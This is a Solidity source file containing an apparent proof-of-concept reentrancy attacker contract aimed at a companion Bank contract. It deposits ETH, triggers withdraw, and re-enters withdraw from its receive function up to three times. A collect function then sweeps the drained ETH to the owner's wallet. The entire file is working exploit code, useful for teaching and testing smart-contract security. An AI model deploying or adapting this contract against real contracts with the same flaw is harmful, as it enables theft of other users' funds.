// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Bank.sol";

/// @notice Reentrancy PoC attacker with a small re-entry limit so it doesn't exhaust gas
contract Attacker {
    Bank public bank;
    address public owner;

    // limit reentry depth to avoid running out of gas during the PoC
    uint256 public reentryCount;
    uint256 public constant MAX_REENTRY = 3;

    constructor(address _bankAddress) {
        bank = Bank(_bankAddress);
        owner = msg.sender;
        reentryCount = 0;
    }

    // Start the attack by depositing some ETH
    function attack() public payable {
        require(msg.value >= 0.01 ether, "Need at least 0.01 ETH to attack");
        // reset counter on each external attack call
        reentryCount = 0;
        bank.addBalance{value: msg.value}();
        bank.withdraw(); // first withdraw triggers fallback recursion
    }

    // Reentrancy happens here — but only up to MAX_REENTRY times
    receive() external payable {
        // Only keep withdrawing while the bank has some balance left
        if (reentryCount < MAX_REENTRY && address(bank).balance > 0) {
            reentryCount++;
            bank.withdraw();
        }
    }

    // Helper: sweep stolen ETH to the attacker’s wallet
    function collect() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
